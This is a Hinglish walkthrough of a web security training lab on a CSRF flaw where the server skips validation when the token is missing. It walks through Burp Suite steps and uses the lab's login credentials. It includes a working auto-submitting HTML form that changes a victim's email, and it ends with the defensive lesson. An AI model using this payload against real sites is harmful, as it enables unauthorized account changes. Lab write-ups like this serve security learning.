## ✅ Lab Ka Naam:

**CSRF where token validation depends on token being present**

---

## 🎯 Goal:

Victim ka email address change karwana via CSRF attack using exploit server.

---

## 🛠️ Tools Required:

* Burp Suite (Community or Pro)
* Exploit server (jo lab ke saath diya gaya hai)

---

## 🔐 Login Credentials:

```
Username: wiener  
Password: peter
```

---

## 🧠 Samajhne Wali Baat:

* Agar CSRF token **galat ho** ⇒ server request **reject kar deta hai**
* Agar CSRF token **nahi diya jaye** ⇒ server request **accept kar leta hai**
* Yeh bug hai, aur isi ka use hum attack mein karenge

---

## 🔍 Step-by-Step Solution:

### 🟢 Step 1: Burp browser se login karo

* Login page kholo
* Login with: `wiener:peter`

---

### 🟢 Step 2: Email change karo manually

* Account settings mein jao
* “Update email” form bharo (koi bhi email e.g. `test123@hacker.com`)
* Submit karo

---

### 🟢 Step 3: Burp Proxy → HTTP history mein request dhoondo

* POST request hogi:

```
POST /my-account/change-email
```

* Body mein kuch aisa hoga:

```txt
email=test123@hacker.com&csrf=H4ck3dCsRfToKen
```

---

### 🟢 Step 4: Burp Repeater mein request bhejo

* Right-click request → Send to Repeater
* CSRF token ki value galat karo → request fail ho jaye gi
* Ab **csrf=** parameter **poora hata do**, sirf yeh bacha do:

```
email=test123@hacker.com
```

* Request bhejo → agar response 302 ya 200 aya → ✅ request accept hui

➡️ **Yehi bug hai** — server token hone par verify karta hai, lekin agar token hi nahi ho, to kuch nahi kehta.

---

### 🟢 Step 5: Exploit HTML banao

Agar Burp Pro hai, to use **Generate CSRF PoC** feature.

Agar **Community Edition** hai, to yeh HTML likho:

```html
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
  <input type="hidden" name="email" value="csrfattack@exploit.com">
</form>
<script>
  document.forms[0].submit();
</script>
```

📌 **Note:**

* `csrf` input **bilkul bhi add na karo**
* Email unique hona chahiye (`csrfattack@exploit.com` or anything)

---

### 🟢 Step 6: Exploit Server pe paste karo

* Exploit server open karo
* “Body” section mein upar wala HTML paste karo
* Click on **“Store”**

---

### 🟢 Step 7: Test your attack

* Click “View exploit” → agar tumhara email change ho jaye to ✔️ exploit kaam kar raha hai

---

### 🟢 Step 8: Final Exploit — victim ko bhejna

* Email change karo `victim@evil.com` jaisa koi unique email
* Click **“Deliver to victim”**

➡️ Lab **solved** ho jaye ga ✅

---

## 🧠 Teri Zuban Mein Summary:

> “Server CSRF token hone par uski value verify karta hai — lekin agar hum token hi na dein to server confused ho jata hai aur email change kar deta hai bina check kiye. Isi logic ko hum ne attack mein use kiya.”

---

## 💥 Is Lab se Kya Seekha?

* Kabhi kabhi **token ki value nahi**, **token ka hona hi important hota hai**
* Agar server `csrf` ka hona required nahi karta properly, to CSRF attack possible hai
* **Validation logic** server-side pe carefully likhna chahiye
